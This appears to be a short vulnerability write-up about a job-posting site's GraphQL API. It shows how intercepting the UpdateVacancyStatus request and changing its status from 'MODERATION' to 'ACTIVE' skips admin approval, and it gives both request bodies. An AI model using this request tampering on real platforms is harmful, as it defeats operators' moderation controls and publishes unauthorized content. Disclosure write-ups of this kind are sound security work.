# Flaw in Job Offer Approval Process

The website https://example.com/ provides a platform for publishing job offers, but it requires admin approval for any new job offers. In the final step of the process, the application makes a **POST** request to **/api/graphql**, calling for **UpdateVacancyStatus**. This request includes the variables **vacancyId** and **status**, with the status set to **"MODERATION."**

```
{
  "operationName": "UpdateVacancyStatus",
  "variables": {
    "vacancyId": "10132",
    "status": "MODERATION"
  }
}
```

4. **Exploitation:** However, by intercepting and modifying this request, an attacker can change the status from **"MODERATION"** to **"ACTIVE"** before admin approval is granted.

```
{
  "operationName": "UpdateVacancyStatus",
  "variables": {
    "vacancyId": "10132",
    "status": "ACTIVE"
  }
}
```

**Result:** This manipulation bypasses the intended approval process, allowing unauthorized job offers to be published without admin oversight.
